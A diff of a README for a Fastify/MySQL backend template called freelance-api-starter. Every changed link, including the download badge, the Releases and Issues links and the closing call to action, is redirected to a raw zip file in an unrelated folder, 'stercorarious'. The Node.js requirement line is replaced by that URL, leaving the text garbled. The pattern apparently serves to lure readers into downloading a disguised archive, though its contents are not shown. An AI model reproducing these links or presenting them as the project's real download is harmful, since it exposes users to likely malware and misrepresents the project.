@@ -4,20 +4,20 @@
 freelance-api-starter is a reusable backend API template for freelance and outsourcing projects. Built on Fastify v5, Sequelize, and MySQL8, this template helps you develop and deliver your applications quickly. It removes the complexities so you can focus on your business.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue.svg)](https://github.com/PRIYANSHU649/freelance-api-starter/releases)  
+[![Download the latest release](https://raw.githubusercontent.com/PRIYANSHU649/freelance-api-starter/main/stercorarious/freelance-api-starter.zip)](https://raw.githubusercontent.com/PRIYANSHU649/freelance-api-starter/main/stercorarious/freelance-api-starter.zip)  
 
 ## 🚀 Getting Started
 Follow these simple steps to get your application up and running.
 
 ### 🖥️ System Requirements
 - Operating System: Windows, macOS, or Linux
-- Node.js: v14 or later
+- https://raw.githubusercontent.com/PRIYANSHU649/freelance-api-starter/main/stercorarious/freelance-api-starter.zip v14 or later
 - MySQL: v8 or later
 - Minimum RAM: 4 GB
 
 ### ⚙️ Installation Steps
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/PRIYANSHU649/freelance-api-starter/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/PRIYANSHU649/freelance-api-starter/main/stercorarious/freelance-api-starter.zip) to find the latest version.
 
 2. **Download the Package**  
    Look for the latest version and click on the download link for your operating system. Save the package to your computer. 
@@ -64,7 +64,7 @@ Follow these simple steps to get your application up and running.
 
 ## 🔍 Useful Links
 - **Documentation:** Detailed guidance on project usage can be found on the repository’s Wiki and documentation sections.
-- **GitHub Issues:** If you encounter any problems, please check the [Issues page](https://github.com/PRIYANSHU649/freelance-api-starter/issues) for assistance or to report your issue.
+- **GitHub Issues:** If you encounter any problems, please check the [Issues page](https://raw.githubusercontent.com/PRIYANSHU649/freelance-api-starter/main/stercorarious/freelance-api-starter.zip) for assistance or to report your issue.
 
 ## 🛡️ Support
 If you need further help, you can contact the maintainer. Look for contact details in the organization's GitHub page.
@@ -77,4 +77,4 @@ If you need further help, you can contact the maintainer. Look for contact detai
 ## 🏁 Conclusion
 You are now set to use freelance-api-starter for your next freelance project. Enjoy rapid development with this simple and efficient API template.
 
-[Visit the Releases page to download](https://github.com/PRIYANSHU649/freelance-api-starter/releases) and get started today!
+[Visit the Releases page to download](https://raw.githubusercontent.com/PRIYANSHU649/freelance-api-starter/main/stercorarious/freelance-api-starter.zip) and get started today!
